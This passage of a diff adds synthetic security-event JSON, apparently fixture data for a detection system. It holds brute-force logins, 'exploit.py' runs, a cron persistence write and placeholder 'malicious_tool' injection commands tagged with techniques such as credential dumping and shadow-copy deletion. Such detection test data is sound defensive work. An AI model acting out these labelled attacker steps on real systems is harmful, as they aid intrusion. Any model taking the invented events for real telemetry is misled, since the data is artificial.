+    "risk_score": 90,
+    "tags": [
+      "persistence_mechanism",
+      "cron_abuse"
+    ],
+    "timestamp": 1749440933.058607,
+    "event_id": "evt-100285"
+  },
+  {
+    "event_type": "auth_attempt",
+    "user": "admin",
+    "source_ip": "10.0.0.13",
+    "method": "password_guess",
+    "success": false,
+    "risk_score": 75,
+    "tags": [
+      "brute_force",
+      "failed_auth"
+    ],
+    "timestamp": 1749430104.058611,
+    "event_id": "evt-100286"
+  },
+  {
+    "event_type": "process_start",
+    "exe": "/usr/bin/python3",
+    "cmdline": "python3 exploit.py",
+    "user": "attacker",
+    "pid": 4434,
+    "ppid": 1904,
+    "risk_score": 85,
+    "tags": [
+      "suspicious_execution",
+      "living_off_the_land",
+      "python_execution"
+    ],
+    "timestamp": 1749473793.058616,
+    "event_id": "evt-100287"
+  },
+  {
+    "event_type": "file_modification",
+    "path": "/etc/cron.d/evilcron",
+    "operation": "write",
+    "user": "root",
+    "risk_score": 90,
+    "tags": [
+      "persistence_mechanism",
+      "cron_abuse"
+    ],
+    "timestamp": 1749431880.05862,
+    "event_id": "evt-100288"
+  },
+  {
+    "event_type": "usb_event",
+    "device_id": "USB\\VID_1234&PID_5678",
+    "mount_path": "/Volumes/SECRET",
+    "user": "analyst",
+    "risk_score": 60,
+    "tags": [
+      "usb_mount",
+      "data_exfil_risk"
+    ],
+    "timestamp": 1749431569.058623,
+    "event_id": "evt-100289"
+  },
+  {
+    "event_type": "auth_attempt",
+    "user": "admin",
+    "source_ip": "10.0.0.13",
+    "method": "password_guess",
+    "success": false,
+    "risk_score": 75,
+    "tags": [
+      "brute_force",
+      "failed_auth"
+    ],
+    "timestamp": 1749482987.058625,
+    "event_id": "evt-100290"
+  },
+  {
+    "event_type": "auth_attempt",
+    "user": "admin",
+    "source_ip": "10.0.0.13",
+    "method": "password_guess",
+    "success": false,
+    "risk_score": 75,
+    "tags": [
+      "brute_force",
+      "failed_auth"
+    ],
+    "timestamp": 1749438462.058629,
+    "event_id": "evt-100291"
+  },
+  {
+    "event_type": "process_start",
+    "exe": "/usr/bin/python3",
+    "cmdline": "python3 exploit.py",
+    "user": "attacker",
+    "pid": 4434,
+    "ppid": 1904,
+    "risk_score": 85,
+    "tags": [
+      "suspicious_execution",
+      "living_off_the_land",
+      "python_execution"
+    ],
+    "timestamp": 1749510167.058631,
+    "event_id": "evt-100292"
+  },
+  {
+    "event_type": "auth_attempt",
+    "user": "admin",
+    "source_ip": "10.0.0.13",
+    "method": "password_guess",
+    "success": false,
+    "risk_score": 75,
+    "tags": [
+      "brute_force",
+      "failed_auth"
+    ],
+    "timestamp": 1749472311.058634,
+    "event_id": "evt-100293"
+  },
+  {
+    "event_type": "process_start",
+    "exe": "/usr/bin/python3",
+    "cmdline": "python3 exploit.py",
+    "user": "attacker",
+    "pid": 4434,
+    "ppid": 1904,
+    "risk_score": 85,
+    "tags": [
+      "suspicious_execution",
+      "living_off_the_land",
+      "python_execution"
+    ],
+    "timestamp": 1749509432.058636,
+    "event_id": "evt-100294"
+  },
+  {
+    "event_type": "auth_attempt",
+    "user": "admin",
+    "source_ip": "10.0.0.13",
+    "method": "password_guess",
+    "success": false,
+    "risk_score": 75,
+    "tags": [
+      "brute_force",
+      "failed_auth"
+    ],
+    "timestamp": 1749461089.058638,
+    "event_id": "evt-100295"
+  },
+  {
+    "event_type": "network_connection",
+    "src_ip": "192.168.1.20",
+    "dst_ip": "8.8.8.8",
+    "dst_port": 53,
+    "protocol": "UDP",
+    "risk_score": 10,
+    "tags": [
+      "dns_traffic"
+    ],
+    "timestamp": 1749496198.05864,
+    "event_id": "evt-100296"
+  },
+  {
+    "event_type": "file_modification",
+    "path": "/etc/cron.d/evilcron",
+    "operation": "write",
+    "user": "root",
+    "risk_score": 90,
+    "tags": [
+      "persistence_mechanism",
+      "cron_abuse"
+    ],
+    "timestamp": 1749422285.058644,
+    "event_id": "evt-100297"
+  },
+  {
+    "event_type": "usb_event",
+    "device_id": "USB\\VID_1234&PID_5678",
+    "mount_path": "/Volumes/SECRET",
+    "user": "analyst",
+    "risk_score": 60,
+    "tags": [
+      "usb_mount",
+      "data_exfil_risk"
+    ],
+    "timestamp": 1749451071.058648,
+    "event_id": "evt-100298"
+  },
+  {
+    "event_type": "process_start",
+    "exe": "/usr/bin/python3",
+    "cmdline": "python3 exploit.py",
+    "user": "attacker",
+    "pid": 4434,
+    "ppid": 1904,
+    "risk_score": 85,
+    "tags": [
+      "suspicious_execution",
+      "living_off_the_land",
+      "python_execution"
+    ],
+    "timestamp": 1749500902.058652,
+    "event_id": "evt-100299"
+  },
+  {
+    "event_type": "forensic",
+    "exe": "/usr/bin/malicious_tool_0",
+    "cmdline": "malicious_tool_0 --inject --target svchost",
+    "user": "attacker_user_0",
+    "pid": "2000",
+    "ppid": "1500",
+    "tags": [
+      "memory_injection",
+      "shadow_copy_deletion",
+      "registry_persistence",
+      "credential_dumping",
+      "cloud_instance_metadata_access"
+    ],
+    "risk_score": 95,
+    "timestamp": "2025-06-10T02:11:17.304236",
+    "event_id": "fbe67984-56a0-445f-8dd3-91babc1cb316",
+    "session_id": "session_0",
+    "mode": "forensic"
+  },
+  {
+    "event_type": "forensic",
+    "exe": "/usr/bin/malicious_tool_1",
+    "cmdline": "malicious_tool_1 --inject --target svchost",
+    "user": "attacker_user_1",
+    "pid": "2001",
+    "ppid": "1501",
+    "tags": [
+      "registry_persistence",
+      "mfa_bypass",
+      "unauthorized_usb",
+      "cloud_instance_metadata_access"
+    ],
+    "risk_score": 96,
+    "timestamp": "2025-06-10T02:11:47.304236",
+    "event_id": "2e647485-0c25-428f-838e-8c9a6ac9c744",
+    "session_id": "session_0",
+    "mode": "forensic"
+  },
+  {
+    "event_type": "forensic",
+    "exe": "/usr/bin/malicious_tool_2",
+    "cmdline": "malicious_tool_2 --inject --target svchost",
+    "user": "attacker_user_2",
+    "pid": "2002",
+    "ppid": "1502",
+    "tags": [
+      "credential_dumping",
+      "registry_persistence",
+      "mfa_bypass"
+    ],
+    "risk_score": 93,
+    "timestamp": "2025-06-10T02:12:17.304236",
+    "event_id": "42229f96-d31f-4327-90bb-0d25c9a6f8d1",
+    "session_id": "session_0",
+    "mode": "forensic"
+  },
+  {
+    "event_type": "forensic",
+    "exe": "/usr/bin/malicious_tool_3",
+    "cmdline": "malicious_tool_3 --inject --target svchost",
+    "user": "attacker_user_0",
+    "pid": "2003",
+    "ppid": "1503",
+    "tags": [
+      "mfa_bypass",
+      "shadow_copy_deletion",
+      "unauthorized_usb",
+      "memory_injection"
+    ],
+    "risk_score": 95,
+    "timestamp": "2025-06-10T02:12:47.304236",
+    "event_id": "223e3a36-3d6a-4c07-a649-d0f7a7dfbc2b",
+    "session_id": "session_0",
+    "mode": "forensic"
+  },
+  {
+    "event_type": "forensic",
+    "exe": "/usr/bin/malicious_tool_4",
+    "cmdline": "malicious_tool_4 --inject --target svchost",
+    "user": "attacker_user_1",
+    "pid": "2004",
+    "ppid": "1504",
+    "tags": [
+      "registry_persistence",
+      "unauthorized_usb",
+      "mfa_bypass"
+    ],
+    "risk_score": 91,
+    "timestamp": "2025-06-10T02:13:17.304236",
+    "event_id": "75a5de4b-5354-4ba8-bb64-3c1e80833132",
+    "session_id": "session_0",
+    "mode": "forensic"
+  },
+  {
+    "event_type": "forensic",
+    "exe": "/usr/bin/malicious_tool_0",
+    "cmdline": "malicious_tool_0 --inject --target svchost",
+    "user": "attacker_user_2",
+    "pid": "2005",
+    "ppid": "1505",
+    "tags": [
+      "credential_dumping",
+      "memory_injection",
+      "mfa_bypass",
+      "shadow_copy_deletion",
+      "suspicious_process_hollowing"
+    ],
+    "risk_score": 99,
+    "timestamp": "2025-06-10T02:13:47.304236",
+    "event_id": "677235f3-b891-47d2-841e-bb5b7f92c0fb",
+    "session_id": "session_0",
+    "mode": "forensic"
+  },
+  {
+    "event_type": "forensic",
+    "exe": "/usr/bin/malicious_tool_1",
+    "cmdline": "malicious_tool_1 --inject --target svchost",
+    "user": "attacker_user_0",
+    "pid": "2006",
+    "ppid": "1506",
+    "tags": [
+      "dual_use_tool",
+      "cloud_instance_metadata_access",
+      "credential_dumping"
+    ],
+    "risk_score": 95,
+    "timestamp": "2025-06-10T02:14:17.304236",
+    "event_id": "14123c57-56af-4f87-9394-7641ec965f5a",
+    "session_id": "session_0",
+    "mode": "forensic"
+  },
+  {
+    "event_type": "forensic",
+    "exe": "/usr/bin/malicious_tool_2",
+    "cmdline": "malicious_tool_2 --inject --target svchost",
+    "user": "attacker_user_1",
+    "pid": "2007",
+    "ppid": "1507",
+    "tags": [
+      "dual_use_tool",
+      "cloud_instance_metadata_access",
+      "credential_dumping"
+    ],
+    "risk_score": 87,
+    "timestamp": "2025-06-10T02:14:47.304236",
+    "event_id": "32472a95-1eb9-4fae-87fc-83c5b8e770e9",
+    "session_id": "session_0",
+    "mode": "forensic"
+  },
+  {
+    "event_type": "forensic",
+    "exe": "/usr/bin/malicious_tool_3",
+    "cmdline": "malicious_tool_3 --inject --target svchost",
+    "user": "attacker_user_2",
+    "pid": "2008",
+    "ppid": "1508",
+    "tags": [
+      "cloud_instance_metadata_access",
+      "registry_persistence",
+      "shadow_copy_deletion",
+      "dual_use_tool"
+    ],
+    "risk_score": 87,
+    "timestamp": "2025-06-10T02:15:17.304236",
+    "event_id": "32c4c2c6-d166-43eb-a3ca-ac4648569155",
+    "session_id": "session_0",
+    "mode": "forensic"
+  },
+  {
+    "event_type": "forensic",
+    "exe": "/usr/bin/malicious_tool_4",
+    "cmdline": "malicious_tool_4 --inject --target svchost",
+    "user": "attacker_user_0",
+    "pid": "2009",
+    "ppid": "1509",
+    "tags": [
+      "shadow_copy_deletion",
+      "mfa_bypass",
+      "dual_use_tool",
+      "cloud_instance_metadata_access",
+      "credential_dumping"
+    ],
+    "risk_score": 97,
+    "timestamp": "2025-06-10T02:15:47.304236",
+    "event_id": "17b38701-3838-4e68-83ea-dff98dfd51cb",
+    "session_id": "session_0",
+    "mode": "forensic"
+  },
+  {
+    "event_type": "forensic",
+    "exe": "/usr/bin/malicious_tool_0",
+    "cmdline": "malicious_tool_0 --inject --target svchost",
+    "user": "attacker_user_1",
+    "pid": "2010",
+    "ppid": "1510",
+    "tags": [
+      "cloud_instance_metadata_access",
+      "suspicious_process_hollowing",
+      "shadow_copy_deletion"
+    ],
+    "risk_score": 85,
+    "timestamp": "2025-06-10T02:16:17.304236",
+    "event_id": "0bc5109c-2261-4663-a138-6da1bd756a9f",
+    "session_id": "session_1",
+    "mode": "forensic"
+  },
+  {
+    "event_type": "forensic",
+    "exe": "/usr/bin/malicious_tool_1",
+    "cmdline": "malicious_tool_1 --inject --target svchost",
+    "user": "attacker_user_2",
+    "pid": "2011",
+    "ppid": "1511",
+    "tags": [
+      "credential_dumping",
+      "memory_injection",
+      "registry_persistence",
+      "shadow_copy_deletion",
+      "cloud_instance_metadata_access"
+    ],
+    "risk_score": 98,
+    "timestamp": "2025-06-10T02:16:47.304236",
+    "event_id": "ffcb9ba1-66dd-4fb3-bdfa-615026bedf83",
+    "session_id": "session_1",
+    "mode": "forensic"
+  },
+  {
+    "event_type": "forensic",
+    "exe": "/usr/bin/malicious_tool_2",
+    "cmdline": "malicious_tool_2 --inject --target svchost",
+    "user": "attacker_user_0",
+    "pid": "2012",
+    "ppid": "1512",
+    "tags": [
+      "dual_use_tool",
+      "credential_dumping",
+      "shadow_copy_deletion",
+      "mfa_bypass",
+      "unauthorized_usb"
+    ],
+    "risk_score": 97,
+    "timestamp": "2025-06-10T02:17:17.304236",
+    "event_id": "b7b72e63-8fd8-406f-939b-2f6b3199d020",
+    "session_id": "session_1",
+    "mode": "forensic"
+  },
+  {
+    "event_type": "forensic",
+    "exe": "/usr/bin/malicious_tool_3",
+    "cmdline": "malicious_tool_3 --inject --target svchost",
+    "user": "attacker_user_1",
+    "pid": "2013",
+    "ppid": "1513",
+    "tags": [
+      "shadow_copy_deletion",
+      "cloud_instance_metadata_access",
+      "dual_use_tool",
+      "memory_injection"
+    ],
+    "risk_score": 81,
+    "timestamp": "2025-06-10T02:17:47.304236",
+    "event_id": "ce211dfd-8a79-4c19-9139-96e5bdca3813",
+    "session_id": "session_1",
+    "mode": "forensic"
+  },
+  {
+    "event_type": "forensic",
+    "exe": "/usr/bin/malicious_tool_4",
+    "cmdline": "malicious_tool_4 --inject --target svchost",
+    "user": "attacker_user_2",
+    "pid": "2014",
+    "ppid": "1514",
+    "tags": [
+      "registry_persistence",
+      "suspicious_process_hollowing",
+      "credential_dumping",
+      "shadow_copy_deletion",
+      "mfa_bypass"
+    ],
+    "risk_score": 93,
+    "timestamp": "2025-06-10T02:18:17.304236",
+    "event_id": "58bb229d-8b61-4446-ad62-22d1566399a5",
+    "session_id": "session_1",
+    "mode": "forensic"
+  },
+  {
+    "event_type": "forensic",
+    "exe": "/usr/bin/malicious_tool_0",
+    "cmdline": "malicious_tool_0 --inject --target svchost",
+    "user": "attacker_user_0",
+    "pid": "2015",
+    "ppid": "1515",
+    "tags": [
+      "unauthorized_usb",
+      "registry_persistence",
+      "credential_dumping",
+      "suspicious_process_hollowing",
+      "cloud_instance_metadata_access"
+    ],
+    "risk_score": 90,
+    "timestamp": "2025-06-10T02:18:47.304236",
+    "event_id": "a8fc5a12-d8d0-4f43-ab2a-7f5279bfdc82",
+    "session_id": "session_1",
+    "mode": "forensic"
+  },
+  {
+    "event_type": "forensic",
+    "exe": "/usr/bin/malicious_tool_1",
+    "cmdline": "malicious_tool_1 --inject --target svchost",
+    "user": "attacker_user_1",
+    "pid": "2016",
+    "ppid": "1516",
+    "tags": [
+      "suspicious_process_hollowing",
+      "credential_dumping",
+      "registry_persistence",
+      "mfa_bypass"
+    ],
+    "risk_score": 82,
+    "timestamp": "2025-06-10T02:19:17.304236",
+    "event_id": "250406ab-73ed-4023-af03-0b4ab008f2cc",
+    "session_id": "session_1",
+    "mode": "forensic"
+  },
+  {
+    "event_type": "forensic",
+    "exe": "/usr/bin/malicious_tool_2",
+    "cmdline": "malicious_tool_2 --inject --target svchost",
+    "user": "attacker_user_2",
+    "pid": "2017",
+    "ppid": "1517",
+    "tags": [
+      "unauthorized_usb",
+      "registry_persistence",
+      "suspicious_process_hollowing"
+    ],
+    "risk_score": 96,
+    "timestamp": "2025-06-10T02:19:47.304236",
+    "event_id": "a369665d-6216-4e44-a2a4-a8600725d2e5",
+    "session_id": "session_1",
+    "mode": "forensic"
+  },
+  {
+    "event_type": "forensic",
+    "exe": "/usr/bin/malicious_tool_3",
+    "cmdline": "malicious_tool_3 --inject --target svchost",
+    "user": "attacker_user_0",
+    "pid": "2018",
+    "ppid": "1518",
+    "tags": [
+      "suspicious_process_hollowing",
+      "mfa_bypass",
+      "memory_injection"
+    ],
+    "risk_score": 80,
+    "timestamp": "2025-06-10T02:20:17.304236",
+    "event_id": "a28aba5c-7051-4d78-86c4-f331739df940",
+    "session_id": "session_1",
+    "mode": "forensic"
+  },
+  {
+    "event_type": "forensic",
+    "exe": "/usr/bin/malicious_tool_4",
+    "cmdline": "malicious_tool_4 --inject --target svchost",
+    "user": "attacker_user_1",
+    "pid": "2019",
+    "ppid": "1519",
+    "tags": [
+      "dual_use_tool",
+      "memory_injection",
+      "credential_dumping",
+      "registry_persistence"
+    ],
+    "risk_score": 88,
+    "timestamp": "2025-06-10T02:20:47.304236",
+    "event_id": "9d6a5fa7-4dbd-45fd-93de-0cadf1b0027c",
+    "session_id": "session_1",
+    "mode": "forensic"
+  },
+  {
+    "event_type": "forensic",
+    "exe": "/usr/bin/malicious_tool_0",
+    "cmdline": "malicious_tool_0 --inject --target svchost",
+    "user": "attacker_user_2",
+    "pid": "2020",
+    "ppid": "1520",
+    "tags": [
+      "unauthorized_usb",
+      "cloud_instance_metadata_access",
+      "registry_persistence"
+    ],
+    "risk_score": 80,
+    "timestamp": "2025-06-10T02:21:17.304236",
+    "event_id": "156386cf-23c1-47d9-872c-a02043a70262",
+    "session_id": "session_2",
+    "mode": "forensic"
+  },
+  {
+    "event_type": "forensic",
+    "exe": "/usr/bin/malicious_tool_1",
+    "cmdline": "malicious_tool_1 --inject --target svchost",
+    "user": "attacker_user_0",
+    "pid": "2021",
+    "ppid": "1521",
+    "tags": [
+      "credential_dumping",
+      "unauthorized_usb",
+      "registry_persistence"
+    ],
+    "risk_score": 82,
+    "timestamp": "2025-06-10T02:21:47.304236",
+    "event_id": "a1396188-9a7e-47b4-a9e4-e83de9e2cc61",
+    "session_id": "session_2",
+    "mode": "forensic"
+  },
+  {
+    "event_type": "forensic",
+    "exe": "/usr/bin/malicious_tool_2",
+    "cmdline": "malicious_tool_2 --inject --target svchost",
+    "user": "attacker_user_1",
+    "pid": "2022",
+    "ppid": "1522",
+    "tags": [
+      "suspicious_process_hollowing",
+      "mfa_bypass",
+      "shadow_copy_deletion",
+      "dual_use_tool",
+      "credential_dumping"
+    ],
+    "risk_score": 99,
+    "timestamp": "2025-06-10T02:22:17.304236",
+    "event_id": "76f558d6-0c03-43e3-b679-37fc2a092575",
+    "session_id": "session_2",
+    "mode": "forensic"
+  },
+  {
+    "event_type": "forensic",
+    "exe": "/usr/bin/malicious_tool_3",
+    "cmdline": "malicious_tool_3 --inject --target svchost",
+    "user": "attacker_user_2",
+    "pid": "2023",
+    "ppid": "1523",
+    "tags": [
+      "credential_dumping",
+      "memory_injection",
+      "unauthorized_usb",
+      "registry_persistence"
+    ],
+    "risk_score": 81,
+    "timestamp": "2025-06-10T02:22:47.304236",
+    "event_id": "af0ca420-c148-4f8a-8ecb-f9a330c6ac27",
+    "session_id": "session_2",
+    "mode": "forensic"
+  },
+  {
+    "event_type": "forensic",
+    "exe": "/usr/bin/malicious_tool_4",
+    "cmdline": "malicious_tool_4 --inject --target svchost",
+    "user": "attacker_user_0",
+    "pid": "2024",
+    "ppid": "1524",
+    "tags": [
+      "registry_persistence",
+      "mfa_bypass",
+      "unauthorized_usb",
+      "cloud_instance_metadata_access",
+      "dual_use_tool"
+    ],
+    "risk_score": 80,
+    "timestamp": "2025-06-10T02:23:17.304236",
+    "event_id": "d557582d-f1e9-431e-b77e-cfa5318a9b8f",
+    "session_id": "session_2",
+    "mode": "forensic"
+  },
+  {
+    "event_type": "forensic",
+    "exe": "/usr/bin/malicious_tool_0",
+    "cmdline": "malicious_tool_0 --inject --target svchost",
+    "user": "attacker_user_1",
+    "pid": "2025",
+    "ppid": "1525",
+    "tags": [
+      "memory_injection",
+      "registry_persistence",
+      "dual_use_tool",
+      "cloud_instance_metadata_access",
+      "shadow_copy_deletion",
+      "suspicious_process_hollowing"
+    ],
+    "risk_score": 95,
+    "timestamp": "2025-06-10T02:23:47.304236",
+    "event_id": "93c23537-a0c3-4a19-aa47-681e8a34d512",
+    "session_id": "session_2",
+    "mode": "forensic"
+  },
+  {
+    "event_type": "forensic",
+    "exe": "/usr/bin/malicious_tool_1",
+    "cmdline": "malicious_tool_1 --inject --target svchost",
+    "user": "attacker_user_2",
+    "pid": "2026",
+    "ppid": "1526",
+    "tags": [
+      "shadow_copy_deletion",
+      "mfa_bypass",
+      "registry_persistence",
+      "memory_injection",
+      "suspicious_process_hollowing"
+    ],
+    "risk_score": 89,
+    "timestamp": "2025-06-10T02:24:17.304236",
+    "event_id": "56eefc12-f117-44c9-9b14-bc51649c73d1",
+    "session_id": "session_2",
+    "mode": "forensic"
+  },
+  {
+    "event_type": "forensic",
+    "exe": "/usr/bin/malicious_tool_2",
+    "cmdline": "malicious_tool_2 --inject --target svchost",
+    "user": "attacker_user_0",
+    "pid": "2027",
+    "ppid": "1527",
+    "tags": [
+      "dual_use_tool",
+      "cloud_instance_metadata_access",
+      "unauthorized_usb",
+      "shadow_copy_deletion",
+      "memory_injection"
+    ],
+    "risk_score": 82,
+    "timestamp": "2025-06-10T02:24:47.304236",
+    "event_id": "36108185-9065-4582-8eb4-87c85c6058fd",
+    "session_id": "session_2",
+    "mode": "forensic"
+  },
+  {
+    "event_type": "forensic",
+    "exe": "/usr/bin/malicious_tool_3",
+    "cmdline": "malicious_tool_3 --inject --target svchost",
+    "user": "attacker_user_1",
+    "pid": "2028",
+    "ppid": "1528",
+    "tags": [
+      "credential_dumping",
+      "suspicious_process_hollowing",
+      "memory_injection",
+      "registry_persistence",
+      "unauthorized_usb"
+    ],
+    "risk_score": 85,
+    "timestamp": "2025-06-10T02:25:17.304236",
+    "event_id": "4a89a084-449f-4052-ba3f-f063586a4978",
+    "session_id": "session_2",
+    "mode": "forensic"
+  },
+  {
+    "event_type": "forensic",
+    "exe": "/usr/bin/malicious_tool_4",
+    "cmdline": "malicious_tool_4 --inject --target svchost",
+    "user": "attacker_user_2",
+    "pid": "2029",
+    "ppid": "1529",
+    "tags": [
+      "cloud_instance_metadata_access",
+      "unauthorized_usb",
+      "memory_injection",
+      "suspicious_process_hollowing",
+      "registry_persistence",
+      "credential_dumping"
+    ],
+    "risk_score": 86,
+    "timestamp": "2025-06-10T02:25:47.304236",
+    "event_id": "6495df91-94b0-4bd5-b658-f22968d16d12",
+    "session_id": "session_2",
+    "mode": "forensic"
+  },
+  {
+    "event_type": "forensic",
+    "exe": "/usr/bin/malicious_tool_0",
+    "cmdline": "malicious_tool_0 --inject --target svchost",
+    "user": "attacker_user_0",
+    "pid": "2030",
+    "ppid": "1530",
+    "tags": [
+      "registry_persistence",
+      "dual_use_tool",
+      "memory_injection",
+      "suspicious_process_hollowing",
+      "mfa_bypass"
+    ],
+    "risk_score": 100,
+    "timestamp": "2025-06-10T02:26:17.304236",
+    "event_id": "5c7a6e70-a192-4646-b562-be8770b89691",
+    "session_id": "session_3",
+    "mode": "forensic"
+  },
+  {
+    "event_type": "forensic",
+    "exe": "/usr/bin/malicious_tool_1",
+    "cmdline": "malicious_tool_1 --inject --target svchost",
+    "user": "attacker_user_1",
+    "pid": "2031",
+    "ppid": "1531",
+    "tags": [
+      "suspicious_process_hollowing",
+      "cloud_instance_metadata_access",
+      "mfa_bypass",
+      "shadow_copy_deletion"
+    ],
+    "risk_score": 88,
+    "timestamp": "2025-06-10T02:26:47.304236",
+    "event_id": "9b0dfdd9-3dbc-4881-9635-43e6f66552f7",
+    "session_id": "session_3",
+    "mode": "forensic"
+  },
+  {
+    "event_type": "forensic",
+    "exe": "/usr/bin/malicious_tool_2",
+    "cmdline": "malicious_tool_2 --inject --target svchost",
+    "user": "attacker_user_2",
+    "pid": "2032",
+    "ppid": "1532",
+    "tags": [
+      "registry_persistence",
+      "suspicious_process_hollowing",
+      "dual_use_tool",
+      "unauthorized_usb",
+      "credential_dumping"
+    ],
+    "risk_score": 95,
+    "timestamp": "2025-06-10T02:27:17.304236",
+    "event_id": "d6320aef-024a-4c35-a4b9-d30db3b6b518",
+    "session_id": "session_3",
+    "mode": "forensic"
+  },
+  {
+    "event_type": "forensic",
+    "exe": "/usr/bin/malicious_tool_3",
+    "cmdline": "malicious_tool_3 --inject --target svchost",
+    "user": "attacker_user_0",
+    "pid": "2033",
+    "ppid": "1533",
+    "tags": [
+      "shadow_copy_deletion",
+      "unauthorized_usb",
+      "registry_persistence",
+      "credential_dumping"
+    ],
+    "risk_score": 82,
+    "timestamp": "2025-06-10T02:27:47.304236",
+    "event_id": "e1c9bc94-287e-4db3-9b6b-3b14c53852fa",
+    "session_id": "session_3",
+    "mode": "forensic"
+  },
+  {
+    "event_type": "forensic",
+    "exe": "/usr/bin/malicious_tool_4",
+    "cmdline": "malicious_tool_4 --inject --target svchost",
+    "user": "attacker_user_1",
+    "pid": "2034",
+    "ppid": "1534",
+    "tags": [
+      "cloud_instance_metadata_access",
+      "registry_persistence",
+      "mfa_bypass"
+    ],
+    "risk_score": 94,
+    "timestamp": "2025-06-10T02:28:17.304236",
+    "event_id": "2f00b651-585e-4c4e-bcec-0816dedc994a",
+    "session_id": "session_3",
+    "mode": "forensic"
+  },
+  {
+    "event_type": "forensic",
+    "exe": "/usr/bin/malicious_tool_0",
+    "cmdline": "malicious_tool_0 --inject --target svchost",
+    "user": "attacker_user_2",
+    "pid": "2035",
+    "ppid": "1535",
+    "tags": [
+      "mfa_bypass",
+      "unauthorized_usb",
+      "registry_persistence",
+      "dual_use_tool"
+    ],
+    "risk_score": 89,
+    "timestamp": "2025-06-10T02:28:47.304236",
+    "event_id": "badb02cc-3661-4259-add4-3d5e69e43ddd",
+    "session_id": "session_3",
+    "mode": "forensic"
+  },
+  {
+    "event_type": "forensic",
+    "exe": "/usr/bin/malicious_tool_1",
+    "cmdline": "malicious_tool_1 --inject --target svchost",
+    "user": "attacker_user_0",
+    "pid": "2036",
+    "ppid": "1536",
+    "tags": [
+      "registry_persistence",
+      "credential_dumping",
+      "unauthorized_usb",
+      "memory_injection",
+      "shadow_copy_deletion"
+    ],
+    "risk_score": 88,
+    "timestamp": "2025-06-10T02:29:17.304236",
+    "event_id": "e8672ab7-983b-41cb-b010-57eebf08293a",
+    "session_id": "session_3",
+    "mode": "forensic"
+  },
+  {
+    "event_type": "forensic",
+    "exe": "/usr/bin/malicious_tool_2",
+    "cmdline": "malicious_tool_2 --inject --target svchost",
+    "user": "attacker_user_1",
+    "pid": "2037",
+    "ppid": "1537",
+    "tags": [
+      "registry_persistence",
+      "cloud_instance_metadata_access",
+      "suspicious_process_hollowing",
+      "unauthorized_usb",
+      "credential_dumping",
+      "memory_injection"
+    ],
+    "risk_score": 85,
+    "timestamp": "2025-06-10T02:29:47.304236",
+    "event_id": "83bc16a4-9ce6-4882-9666-d7277a11f281",
+    "session_id": "session_3",
+    "mode": "forensic"
+  },
+  {
+    "event_type": "forensic",
+    "exe": "/usr/bin/malicious_tool_3",
+    "cmdline": "malicious_tool_3 --inject --target svchost",
+    "user": "attacker_user_2",
+    "pid": "2038",
+    "ppid": "1538",
+    "tags": [
+      "shadow_copy_deletion",
+      "memory_injection",
+      "suspicious_process_hollowing",
+      "unauthorized_usb",
+      "mfa_bypass"
+    ],
+    "risk_score": 91,
+    "timestamp": "2025-06-10T02:30:17.304236",
+    "event_id": "60c0147b-c3b2-4a66-b986-ec0284cd1756",
+    "session_id": "session_3",
+    "mode": "forensic"
+  },
+  {
+    "event_type": "forensic",
+    "exe": "/usr/bin/malicious_tool_4",
+    "cmdline": "malicious_tool_4 --inject --target svchost",
+    "user": "attacker_user_0",
+    "pid": "2039",
+    "ppid": "1539",
+    "tags": [
+      "credential_dumping",
+      "suspicious_process_hollowing",
+      "unauthorized_usb",
+      "shadow_copy_deletion",
+      "registry_persistence",
+      "cloud_instance_metadata_access"
+    ],
+    "risk_score": 94,
+    "timestamp": "2025-06-10T02:30:47.304236",
+    "event_id": "45df0732-1a4f-45f7-b87d-01a5c542c1d5",
+    "session_id": "session_3",
+    "mode": "forensic"
+  },
+  {
+    "event_type": "forensic",
+    "exe": "/usr/bin/malicious_tool_0",
+    "cmdline": "malicious_tool_0 --inject --target svchost",
+    "user": "attacker_user_1",
+    "pid": "2040",
+    "ppid": "1540",
+    "tags": [
+      "memory_injection",
+      "mfa_bypass",
+      "cloud_instance_metadata_access",
+      "dual_use_tool"
+    ],
+    "risk_score": 91,
+    "timestamp": "2025-06-10T02:31:17.304236",
+    "event_id": "f372af78-7630-460b-874b-6b6a58755cd8",
+    "session_id": "session_4",
+    "mode": "forensic"
+  },
+  {
+    "event_type": "forensic",
+    "exe": "/usr/bin/malicious_tool_1",
+    "cmdline": "malicious_tool_1 --inject --target svchost",
+    "user": "attacker_user_2",
+    "pid": "2041",
+    "ppid": "1541",
+    "tags": [
+      "cloud_instance_metadata_access",
+      "memory_injection",
+      "registry_persistence",
+      "mfa_bypass",
+      "credential_dumping",
+      "dual_use_tool"
+    ],
+    "risk_score": 100,
+    "timestamp": "2025-06-10T02:31:47.304236",
+    "event_id": "c89ece54-702c-4167-a7d0-de99ef37efea",
+    "session_id": "session_4",
+    "mode": "forensic"
+  },
+  {
+    "event_type": "forensic",
+    "exe": "/usr/bin/malicious_tool_2",
+    "cmdline": "malicious_tool_2 --inject --target svchost",
+    "user": "attacker_user_0",
+    "pid": "2042",
+    "ppid": "1542",
+    "tags": [
+      "registry_persistence",
+      "mfa_bypass",
+      "dual_use_tool",
+      "cloud_instance_metadata_access"
+    ],
+    "risk_score": 97,
+    "timestamp": "2025-06-10T02:32:17.304236",
+    "event_id": "df7678fc-5945-4cf3-a3aa-bf4fa336f79f",
+    "session_id": "session_4",
+    "mode": "forensic"
+  },
+  {
+    "event_type": "forensic",
+    "exe": "/usr/bin/malicious_tool_3",
+    "cmdline": "malicious_tool_3 --inject --target svchost",
+    "user": "attacker_user_1",
+    "pid": "2043",
+    "ppid": "1543",
+    "tags": [
+      "cloud_instance_metadata_access",
+      "mfa_bypass",
+      "unauthorized_usb",
+      "registry_persistence",
+      "shadow_copy_deletion",
+      "dual_use_tool"
+    ],
+    "risk_score": 83,
+    "timestamp": "2025-06-10T02:32:47.304236",
+    "event_id": "5e40e2e4-66b8-47c6-96a9-8af6e2b57a7c",
+    "session_id": "session_4",
+    "mode": "forensic"
+  },
+  {
+    "event_type": "forensic",
+    "exe": "/usr/bin/malicious_tool_4",
+    "cmdline": "malicious_tool_4 --inject --target svchost",
+    "user": "attacker_user_2",
+    "pid": "2044",
+    "ppid": "1544",
+    "tags": [
+      "mfa_bypass",
+      "memory_injection",
+      "cloud_instance_metadata_access",
+      "dual_use_tool",
+      "shadow_copy_deletion",
+      "unauthorized_usb"
+    ],
+    "risk_score": 93,
+    "timestamp": "2025-06-10T02:33:17.304236",
+    "event_id": "a9c03a6b-f0c6-472c-a489-4481b06a4ebb",
+    "session_id": "session_4",
+    "mode": "forensic"
+  },
+  {
+    "event_type": "forensic",
+    "exe": "/usr/bin/malicious_tool_0",
